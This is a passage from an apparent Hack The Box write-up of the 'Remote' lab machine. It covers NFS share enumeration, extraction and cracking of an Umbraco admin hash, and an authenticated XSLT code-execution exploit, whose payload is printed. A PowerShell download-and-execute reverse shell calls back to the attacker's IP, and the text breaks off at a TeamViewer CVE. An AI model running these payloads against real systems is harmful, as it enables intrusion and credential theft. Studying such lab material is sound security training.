&lt;p&gt;&lt;img src=&quot;../figs/remote-htb2.png&quot; alt=&quot;login page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the machine description, we need to login into Umbraco CMS in order to exploit the vulnerability, so we are stuck here. Let’s move to the next interesting ports.&lt;/p&gt;

&lt;h3 id=&quot;ports-139-445&quot;&gt;Ports 139, 445&lt;/h3&gt;

&lt;p&gt;These are related to SMB. I tried to enumerate these manually, but with not success. It seems it is for authenticated users only. Let’s move to the NFS port.&lt;/p&gt;

&lt;h3 id=&quot;port-2049&quot;&gt;Port 2049&lt;/h3&gt;

&lt;p&gt;According to the machine description, the credentials to the Umbraco CMS lie somewhere in the NFS share. Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;showmount&lt;/code&gt; to list available public shares:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;showmount &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; 10.129.229.68
Export list &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.229.68:
/site_backups &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;everyone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we are able to connect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/site_backups&lt;/code&gt; share. From its name, it seems to be the backup files that makes the website up running. To connect, we need to create a mount point first with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir -p /tmp/mnt&lt;/code&gt; for example. Using &lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting&quot;&gt;HackTricks&lt;/a&gt;, we find the command to connect to the NFS share:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; nfs &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;vers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3,nolock &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;:/site_backups /tmp/mnt/
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/mnt
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/mnt &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Upon a quick research of where Umbraco stores passwords, we find &lt;a href=&quot;https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials&quot;&gt;this&lt;/a&gt; stackoverflow post. We see that it is inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;App_Data/Umbraco.sdf&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/mnt &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; Umbraco.sdf &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f
./App_Data/Umbraco.sdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If we try to cat it, we will see that it seems like a binary file: unreadable. Let’s try to grep for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwordhash&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash&lt;/code&gt;. The last search yields:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/remote-htb3.png&quot; alt=&quot;password-hash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Showing the password hash is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b8be16afba8c314ad33d812f22a04991b90e2aaa&lt;/code&gt; and uses SHA1 hash. We can also see that the admin’s email is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@htb.local&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can use John The Ripper to crack this hash:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;:RAW-SHA1 &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;:/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Raw-SHA1 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA1 128/128 AVX 4x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
No password hashes left to crack &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;see FAQ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--show&lt;/span&gt; hash.txt 
?:baconandcheese

1 password &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;cracked, 0 left
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;back-to-website&quot;&gt;Back to website…&lt;/h3&gt;

&lt;p&gt;Now that we have the credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@htb.local:baconandcheese&lt;/code&gt;, let’s try and log in:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/remote-htb4.png&quot; alt=&quot;logged in webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we are in the website! Note that the Umbraco version used is 7.12.4.  Now, it’s time to find an exploit for this online. A quick Google search &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;umbraco 7.12.4 exploit&lt;/code&gt; leads to &lt;a href=&quot;https://www.exploit-db.com/exploits/49488&quot;&gt;this&lt;/a&gt; exploit. From the code, it seems to making a POST request to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&lt;/code&gt; endpoint with this payload:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\
&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;lt;?xml version=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&amp;gt;&amp;lt;xsl:stylesheet version=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; xmlns:xsl=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://www.w3.org/1999/XSL/Transform&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; xmlns:msxsl=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;urn:schemas-microsoft-com:xslt&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; xmlns:csharp_user=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://csharp.mycompany.com/mynamespace&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&amp;lt;msxsl:script language=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C#&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; implements-prefix=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;csharp_user&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;public string xml() { string cmd = &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  &amp;lt;/msxsl:script&amp;gt;&amp;lt;xsl:template match=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt; &amp;lt;xsl:value-of select=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;csharp_user:xml()&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&amp;gt; &amp;lt;/xsl:template&amp;gt; &amp;lt;/xsl:stylesheet&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\
&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From what I understood, this payload appears to be an XML file that uses XSLT with embedded C# code. XSLT is a language used for transforming XML documents into other formats. The payload is structured to not only perform a transformation but also execute C# code within the context of an XSLT processor that supports the msxsl:script extension.&lt;/p&gt;

&lt;p&gt;The embedded C# code here is used to run arbitrary code passed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; switches. The exploit has a line that says:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#usage python exploit.py -u admin@example.org -p password123 -i &apos;http://10.0.0.1&apos; -c ipconfig
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s test it out!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python exploit.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin@htb.local &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; baconandcheese &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; http://10.129.14.142 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : .htb
   IPv6 Address. &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : dead:beef::8a
   IPv6 Address. &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : dead:beef::d5a:847:7d7c:ae55
   Link-local IPv6 Address &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : fe80::d5a:847:7d7c:ae55%12
   IPv4 Address. &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : 10.129.14.142
   Subnet Mask &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : 255.255.0.0
   Default Gateway &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; : fe80::250:56ff:feb9:2bb5%12
                                       10.129.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Amazing! We are able to execute arbitrary code server-side. Now, we must think of a way to spawn a reverse shell.&lt;/p&gt;

&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;

&lt;p&gt;Upon a long search, I ended up with this powershell script from &lt;a href=&quot;https://github.com/samratashok/nishang#anti-virus&quot;&gt;Nishang&lt;/a&gt;. As we can see, we can spawn a reverse shell if WIndows runs the following command:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;yourwebserver&amp;gt;/Invoke-PowerShellTcp.ps1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Invoke-PowerShellTcp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Reverse&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-IPAddress&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Port&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PortNo.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, one way we could try to access the reverse shell is by running the exploit as this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python exploit.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin@htb.local &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; baconandcheese &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://10.129.14.142&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cmd.exe&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c powershell -c iex(new-object net.webclient).downloadstring(&apos;http://10.10.16.14/Invoke-PowerShellTcp.ps1&apos;);;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.14 -Port 4444&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;For that to work, we need to run a Python server where our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; script is, and also run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 4444&lt;/code&gt; to receive the shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;root: 
Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then, in another tab:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and finally, we run the exploit:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.pyvenv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python exploit.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; admin@htb.local &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; baconandcheese &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://10.129.14.142&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cmd.exe&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c powershell -c iex(new-object net.webclient).downloadstring(&apos;http://10.10.16.14/Invoke-PowerShellTcp.ps1&apos;);;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.14 -Port 4444&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In our netcat, we got a connection:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4444
Connection from 10.129.14.142:49693
Windows PowerShell running as user REMOTE&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;on REMOTE
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.

PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt;whoami
iis apppool&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;efaultapppool
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, we are not root, but we have access to the system. Let’s now think of a way of escalate privileges.&lt;/p&gt;

&lt;h2 id=&quot;step-3---escalating-privileges&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Escalating privileges&lt;/h2&gt;

&lt;p&gt;We first need to know where TeamViewer is running. For that, we can run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netsrv&amp;gt; tasklist /svc
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
svchost.exe                   2200 W3SVC, WAS                                  
vmtoolsd.exe                  2208 VMTools                                     
TeamViewer_Service.exe        2216 TeamViewer7                                 
svchost.exe                   2236 W32Time                                     
MsMpEng.exe                   2244 WinDefend     
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we take a look on CVEs regarding TeamViewer7. After searching through lots of different CVEs, it seems that it is &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2019-18988/&quot;&gt;this&lt;/a&gt; one. Summarizing it, we have:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;TeamViewer Desktop through 14.7.1965 allows a bypass of remote-login access control because the same key is used for different customers’ installations. It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPasswordAES in the current version of the product. If an attacker were to know this key, they could decrypt protect information stored in the registry or configuration files of TeamViewer. With versions before v9.x , this allowed for attackers to decrypt the Unattended Access password to the system (which allows for remote login to the system as well as headless file browsing). The latest version still uses the same key for OptionPasswordAES but appears to have changed how the Unattended Access password is stored. While in most cases an attacker requires an existing session on a system, if the registry/configuration keys were stored off of the machine 